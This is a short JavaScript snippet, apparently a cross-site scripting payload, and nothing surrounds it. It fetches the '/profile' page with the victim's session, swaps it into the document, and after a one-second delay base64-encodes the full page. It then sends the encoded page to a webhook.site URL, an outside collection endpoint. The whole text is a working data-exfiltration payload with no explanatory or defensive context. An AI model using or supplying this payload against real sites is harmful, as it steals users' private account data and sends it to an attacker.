fetch("/profile")
    .then(response => response.text())
    .then(html => {
        // 1. Replace current page with profile content
        document.documentElement.innerHTML = html;
        
        // 2. Send the NEW page content to webhook
        setTimeout(() => {
            var newContent = document.documentElement.outerHTML;
            fetch('https://webhook.site/04e02681-01c6-43b0-adf8-8b311acc9b60/?changed=' + 
                  btoa(newContent));
        }, 1000); // Wait 1 second for page to render
    });
